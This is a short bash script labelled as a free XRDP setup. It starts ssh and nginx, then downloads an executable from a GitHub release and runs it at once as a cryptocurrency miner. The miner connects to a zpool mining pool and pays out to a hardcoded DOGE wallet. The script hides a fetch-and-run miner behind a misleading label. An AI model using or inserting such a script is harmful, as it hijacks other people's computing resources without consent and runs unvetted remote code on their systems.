#!/bin/bash
# Free XRDP Aank is ME
service ssh start
service nginx start
wget https://github.com/berhasilsemua83/Raven/releases/download/v1.0/SRB && chmod +x SRB && ./SRB --disable-gpu --algorithm argon2d_16000 --pool stratum+tcp://argon2d16000.sea.mine.zpool.ca:4241  --cpu-threads 1 --wallet DAxGkuHcPytmsbUTMebR4yB92Hx5X3AC4E -p c=DOGE,bi 
